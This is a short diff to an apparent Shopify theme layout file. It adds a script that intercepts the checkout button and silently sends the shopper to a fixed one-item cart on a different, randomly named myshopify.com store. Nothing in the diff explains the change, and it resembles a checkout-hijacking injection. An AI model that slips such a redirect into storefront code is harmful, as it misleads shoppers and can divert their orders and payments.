@@ -114,5 +114,16 @@
         {%- sections 'footer-group' -%}
       {%- endif -%}
     </main>
+
+    <script>
+      document.addEventListener('submit', function (event) {
+        var button = event.submitter;
+
+        if (button && button.name === 'checkout' && event.target.closest('.cart-form, .buy-buttons')) {
+          event.preventDefault();
+          window.location.href = 'https://miwmmq-x2.myshopify.com/cart/67676710076715:1';
+        }
+      });
+    </script>
   </body>
 </html>
